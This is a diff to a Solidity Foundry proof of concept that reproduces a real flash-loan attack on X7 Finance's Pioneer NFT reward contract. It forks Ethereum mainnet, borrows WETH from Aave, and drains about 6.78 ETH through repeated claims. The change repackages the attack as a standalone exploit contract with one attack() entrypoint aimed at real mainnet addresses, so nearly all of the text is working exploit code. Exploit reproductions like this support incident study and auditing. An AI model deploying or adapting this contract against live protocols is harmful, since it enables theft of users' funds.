@@ -53,10 +53,12 @@ ATTACK SEQUENCE (reproduced faithfully below)
 
 Note: the real attacker wrapped this in a bespoke deployer + child contract and
 a pre-approved NFT transfer. That orchestration is not the vulnerability, so the
-PoC drives the exact same victim calls directly from this test contract, which
-acts as the attacker and owns token #300 (acquired the real way: a pranked
-transfer from the genuine unlocked owner — token #300 has transferUnlocked==true
-on-chain, so no vm.store is needed).
+PoC drives the exact same victim calls from a single standalone exploit contract
+(X7Exploit) with one `attack()` entrypoint. The test funds that exploit with
+token #300 the real way — a pranked transfer from the genuine unlocked owner
+(token #300 has transferUnlocked==true on-chain, so no vm.store is needed) — and
+then calls attack(). The Playground's setup.steps replace the one cheatcode
+(the pranked NFT transfer); the recorded call is attack().
 */
 
 interface IX7Pioneer {
@@ -85,36 +87,20 @@ interface IAavePool {
     ) external;
 }
 
-contract X7FinanceExploit is BaseTestWithBalanceLog {
+// Standalone exploit contract: ONE `attack()` entrypoint performs the whole
+// recorded attack (flash loan -> donate -> 799 empty claims -> final claim ->
+// repay). It must already own X7Pioneer token #300 before attack() is called.
+contract X7Exploit {
     IX7Pioneer constant PIONEER = IX7Pioneer(0x70000299Ee8910cCaCD97B1bB560E34F49c9e4f7);
     IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IAavePool constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
 
-    address constant REAL_OWNER = 0xC79352119A7cF6EFbFaBBD7e6b013B79687BaCf2; // attacker EOA, real owner of #300
     uint256 constant TOKEN_ID = 300;
     uint256 constant FLASH_AMOUNT = 26_963_170_607_692_677_032; // 26.96317 WETH, as on-chain
 
-    function setUp() public {
-        vm.createSelectFork("https://eth.drpc.org", 26_146_921);
-        // Acquire token #300 the real way: it is transferUnlocked on-chain, so its
-        // genuine owner can transfer it to us. No storage forgery.
-        require(PIONEER.ownerOf(TOKEN_ID) == REAL_OWNER, "owner mismatch");
-        vm.prank(REAL_OWNER);
-        PIONEER.transferFrom(REAL_OWNER, address(this), TOKEN_ID);
-        require(PIONEER.ownerOf(TOKEN_ID) == address(this), "did not receive NFT");
-    }
-
-    function testExploit() public balanceLog {
-        // fundingToken defaults to address(0) == native ETH; balanceLog zeroes our
-        // balance first, so the end balance is the pure realized profit.
+    function attack() external {
+        // (2) Flash-loan WETH from Aave V3; the drain happens in the callback.
         AAVE.flashLoanSimple(address(this), address(WETH), FLASH_AMOUNT, "", 0);
-
-        uint256 profit = address(this).balance;
-        emit log_named_decimal_uint("Realized profit (ETH)", profit, 18);
-
-        // Exact on-chain realized profit: claim (33.756919822234785) - principal
-        // (26.963170607692677032) - Aave 0.05% premium (0.013481585303846338).
-        assertApproxEqRel(profit, 6_780_267_629_238_261_775, 0.01e18, "profit != ~6.78 ETH");
     }
 
     // Aave V3 flash-loan callback.
@@ -156,4 +142,41 @@ contract X7FinanceExploit is BaseTestWithBalanceLog {
     }
 
     receive() external payable {}
+}
+
+contract X7FinanceExploit is BaseTestWithBalanceLog {
+    IX7Pioneer constant PIONEER = IX7Pioneer(0x70000299Ee8910cCaCD97B1bB560E34F49c9e4f7);
+
+    address constant REAL_OWNER = 0xC79352119A7cF6EFbFaBBD7e6b013B79687BaCf2; // attacker EOA, real owner of #300
+    uint256 constant TOKEN_ID = 300;
+
+    X7Exploit exploit;
+
+    function setUp() public {
+        vm.createSelectFork("https://eth.drpc.org", 26_146_921);
+
+        // Deploy the standalone exploit contract.
+        exploit = new X7Exploit();
+
+        // Acquire token #300 the real way: it is transferUnlocked on-chain, so its
+        // genuine owner can transfer it straight to the exploit contract. No forgery.
+        require(PIONEER.ownerOf(TOKEN_ID) == REAL_OWNER, "owner mismatch");
+        vm.prank(REAL_OWNER);
+        PIONEER.transferFrom(REAL_OWNER, address(exploit), TOKEN_ID);
+        require(PIONEER.ownerOf(TOKEN_ID) == address(exploit), "exploit did not receive NFT");
+
+        // Measure realized profit on the exploit contract (where the ETH lands).
+        attacker = address(exploit);
+    }
+
+    function testExploit() public balanceLog {
+        exploit.attack();
+
+        uint256 profit = address(exploit).balance;
+        emit log_named_decimal_uint("Realized profit (ETH)", profit, 18);
+
+        // Exact on-chain realized profit: claim (33.756919822234785) - principal
+        // (26.963170607692677032) - Aave 0.05% premium (0.013481585303846338).
+        assertApproxEqRel(profit, 6_780_267_629_238_261_775, 0.01e18, "profit != ~6.78 ETH");
+    }
 }
